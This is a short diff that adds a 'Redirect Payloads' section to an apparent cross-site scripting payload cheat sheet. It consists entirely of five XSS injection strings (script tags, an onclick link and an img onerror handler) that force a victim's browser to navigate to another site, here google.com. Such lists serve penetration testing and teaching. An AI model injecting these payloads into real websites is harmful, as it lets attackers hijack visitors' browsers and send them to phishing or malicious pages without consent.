@@ -14,3 +14,12 @@ Basic Payloads For First Step
 
 
 
+Redirect Payloads
+-------------------------------------------------
+<script>window.location='https://google.com'</script>
+<script>window.location=&quot;https://google.com&quot;</script>
+<script>location='https://google.com'</script>
+<a href="#" onclick="location='https://google.com'">Click me</a>
+<img src=x onerror="location='https://google.com'">
+
+
